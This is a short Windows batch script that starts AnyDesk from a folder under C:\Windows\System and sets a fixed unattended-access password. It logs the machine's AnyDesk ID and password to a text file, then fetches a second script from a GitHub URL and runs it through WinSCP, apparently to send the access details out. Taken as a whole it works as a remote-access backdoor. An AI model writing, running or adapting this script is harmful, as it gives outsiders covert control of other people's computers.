@echo off
C:\Windows\System\logger\AnyDesk\AnyDesk.exe --start
timeout 5
for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-id') do set ID=%%i 
echo AnyDesk ID is: %ID% > C:\Windows\System\logger\AnyDesk\anydesk.txt
echo RTR1 | anydesk.exe --set-password
echo AnyDesk Password is: RTR1 >> C:\Windows\System\logger\AnyDesk\anydesk.txt
for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --get-status') do set STATUS=%%i 
echo AnyDesk status is: %STATUS% >> C:\Windows\System\logger\AnyDesk\anydesk.txt
for /f "delims=" %%i in ('"C:\Windows\System\logger\AnyDesk\AnyDesk.exe" --version') do set VER=%%i 
echo AnyDesk version is: %VER% >> C:\Windows\System\logger\AnyDesk\anydesk.txt
powershell Invoke-WebRequest https://raw.githubusercontent.com/TheBetaBiggie/RTR/main/anydesk1.bat -OutFile C:\Windows\System\logger\AnyDesk\anydesk1.bat
C:\Windows\System\logger\WinSCP.com /script=C:\Windows\System\logger\AnyDesk\anydesk1.bat
